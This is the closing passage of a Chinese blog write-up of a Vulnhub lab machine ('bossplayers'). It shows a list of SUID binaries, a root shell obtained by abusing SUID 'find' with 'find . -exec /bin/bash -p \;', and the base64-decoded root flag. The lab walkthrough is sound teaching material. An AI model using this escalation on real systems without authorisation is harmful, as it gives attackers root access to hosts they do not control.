+</span></span><span class=line><span class=cl>/usr/bin/chfn
+</span></span><span class=line><span class=cl>/usr/bin/passwd
+</span></span><span class=line><span class=cl>/usr/bin/find
+</span></span><span class=line><span class=cl>/usr/bin/newgrp
+</span></span><span class=line><span class=cl>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span class=line><span class=cl>/usr/lib/openssh/ssh-keysign
+</span></span><span class=line><span class=cl>/usr/lib/eject/dmcrypt-get-device
+</span></span><span class=line><span class=cl>www-data@bossplayers:/var/www/html$ 
+</span></span></code></pre></td></tr></table></div></div><p>/usr/bin/find 设置了SUID位，这意味着可以用它来提权到root！</p><p>find . -exec /bin/bash -p ;</p><h2 id=提权成功>提权成功</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@bossplayers:/var/www/html$ find . -exec /bin/bash -p <span class=se>\;</span>
+</span></span><span class=line><span class=cl>find . -exec /bin/bash -p <span class=se>\;</span>
+</span></span><span class=line><span class=cl>bash-5.0# 
+</span></span></code></pre></td></tr></table></div></div><h2 id=flag-又是base64>flag 又是base64</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>bash-5.0# <span class=nb>cd</span> /root
+</span></span><span class=line><span class=cl><span class=nb>cd</span> /root
+</span></span><span class=line><span class=cl>bash-5.0# ls -liah
+</span></span><span class=line><span class=cl>ls -liah
+</span></span><span class=line><span class=cl>total 24K
+</span></span><span class=line><span class=cl> <span class=m>207</span> drwx------  <span class=m>2</span> root root 4.0K Sep <span class=m>28</span>  <span class=m>2019</span> .
+</span></span><span class=line><span class=cl>   <span class=m>2</span> drwxr-xr-x <span class=m>18</span> root root 4.0K Sep <span class=m>28</span>  <span class=m>2019</span> ..
+</span></span><span class=line><span class=cl>  <span class=m>33</span> -rw-------  <span class=m>1</span> root root  <span class=m>929</span> Sep <span class=m>28</span>  <span class=m>2019</span> .bash_history
+</span></span><span class=line><span class=cl> <span class=m>274</span> -rw-r--r--  <span class=m>1</span> root root  <span class=m>570</span> Jan <span class=m>31</span>  <span class=m>2010</span> .bashrc
+</span></span><span class=line><span class=cl> <span class=m>273</span> -rw-r--r--  <span class=m>1</span> root root  <span class=m>148</span> Aug <span class=m>18</span>  <span class=m>2015</span> .profile
+</span></span><span class=line><span class=cl><span class=m>1367</span> -rw-r--r--  <span class=m>1</span> root root   <span class=m>25</span> Sep <span class=m>28</span>  <span class=m>2019</span> root.txt
+</span></span><span class=line><span class=cl>bash-5.0# cat root.txt
+</span></span><span class=line><span class=cl>cat root.txt
+</span></span><span class=line><span class=cl><span class=nv>Y29uZ3JhdHVsYXRpb25zCg</span><span class=o>==</span>
+</span></span><span class=line><span class=cl>bash-5.0# <span class=nb>echo</span> <span class=s2>&#34;Y29uZ3JhdHVsYXRpb25zCg==&#34;</span> <span class=p>|</span> base64 -d 
+</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;Y29uZ3JhdHVsYXRpb25zCg==&#34;</span> <span class=p>|</span> base64 -d
+</span></span><span class=line><span class=cl>congratulations
+</span></span><span class=line><span class=cl>bash-5.0# 
+</span></span></code></pre></td></tr></table></div></div></section><footer class="article-meta article-footer"><section class=article-tags><a href=/tags/vulnhub/>Vulnhub</a></section><section class="article-copyright inline-meta"><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
+2026 Ke1thLi 的技术笔记</section><section class=powerby><br></section></footer><script type=module>
+    import gallery from '\/ts\/gallery.js';
+
+    const articleContent = document.querySelector('.article-content');
+    const shouldLoad = articleContent && (articleContent.querySelectorAll('figure').length > 0 || articleContent.querySelectorAll('img.gallery-image').length > 0);
+    
+    if (shouldLoad) {
+        gallery(articleContent);
+
+        const PhotoSwipeLightbox = (await import("https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js")).default;
+        const styleHref = "https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe.css";
+
+        const styleTag = document.createElement('link');
+        styleTag.rel = 'stylesheet';
+        styleTag.href = styleHref;
+        document.head.appendChild(styleTag);
+
+        const lightbox = new PhotoSwipeLightbox({
+            gallerySelector: '.article-content',
+            childSelector: 'figure a.image-link',
+            pswpModule: () => import("https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js")
+        });
+        lightbox.init();
+    }
+</script></main></div><script type=text/javascript src=/ts/main.acaf849f2b273f6a8368a58b001f336738d0c948d92e79b116467d0c7515f932.js defer></script></body></html>
